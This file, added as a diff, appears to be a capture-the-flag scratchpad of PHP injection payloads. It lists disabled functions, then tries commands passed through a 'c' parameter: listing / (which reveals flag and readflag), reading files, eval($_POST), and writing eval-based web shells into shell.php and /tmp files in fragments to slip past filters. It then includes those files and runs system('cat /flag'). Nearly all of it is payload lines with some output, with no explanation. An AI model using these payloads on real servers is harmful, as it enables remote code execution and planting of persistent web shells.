@@ -1,0 +1,75 @@
+pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,ld,mb_send_mail
+
+c=var_dump(scandir(getcwd()));
+array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) "index.html" [3]=> string(9) "index.php" } 
+
+c=var_dump(scandir("/"));
+array(25) { [0]=> string(1) "." [1]=> string(2) ".." 
+[2]=> string(10) ".dockerenv" 
+[3]=> string(3) "bin" 
+[4]=> string(4) "boot" 
+[5]=> string(3) "dev" 
+[6]=> string(3) "etc" 
+[7]=> string(4) "flag" 
+[8]=> string(4) "home" 
+[9]=> string(3) "lib" 
+[10]=> string(5) "lib64" 
+[11]=> string(5) "media" 
+[12]=> string(3) "mnt" 
+[13]=> string(3) "opt" 
+[14]=> string(4) "proc" 
+[15]=> string(8) "readflag" 
+[16]=> string(4) "root" 
+[17]=> string(3) "run" 
+[18]=> string(4) "sbin" 
+[19]=> string(3) "srv" 
+[20]=> string(8) "start.sh" 
+[21]=> string(3) "sys" 
+[22]=> string(3) "tmp" 
+[23]=> string(3) "usr" 
+[24]=> string(3) "var" } 
+
+c=var_dump(show_source("/readflag"));
+
+c=var_dump(eval($_POST['a']));
+
+c=var_dump(fputs(fopen("shell.php","w"),"<?php eval($_POST[xxx]);?>"));
+
+c=var_dump(file_put_contents("/tmp/a.php","<?php eval;?>"));
+
+c=var_dump(scandir("/tmp"));
+
+c=var_dump(fputs(fopen("/tmp/test.php","w"),"<?php system("cat /flag")));
+
+c=var_dump(show_source("/tmp/test.php"));
+
+c=var_dump(file_put_contents("/tmp/b.php","<?php eval"));
+
+c=var_dump(fputs(fopen("/tmp/shell.php","w"),"<?php eval"));
+
+c=var_dump(show_source("/tmp/shell.php"));
+
+c=var_dump(fputs(fopen("/tmp/shell.php","a"),");?>"));
+
+c=var_dump(include("/tmp/shell.php"));
+
+c=var_dump(fputs(fopen("/tmp/shell.php","a"),"GET[shell]);?>"));
+
+c=var_dump(fputs(fopen("/tmp/shell.php","w"),"<?php eval("));
+
+c=var_dump(fputs(fopen("/tmp/shell.php","a"),"$"));
+
+c=var_dump(fputs(fopen("/tmp/shell.php","a"),"_POST['b']);?>"));
+
+c=var_dump(fputs(fopen("/tmp/flag.txt","w"),""));
+
+
+c=var_dump(scandir("/tmp"));
+c=var_dump(fputs(fopen("/tmp/*","w"),""));
+c=var_dump(show_source("/tmp/p4.php"));
+c=var_dump(unlink("/tmp/*"));
+
+
+c=var_dump(fputs(fopen("/tmp/test.php","w"),"<?php eval("));
+c=var_dump(fputs(fopen("/tmp/test.php","a"),"$"));
+c=var_dump(fputs(fopen("/tmp/test.php","a"),"_POST['c']);?>"));
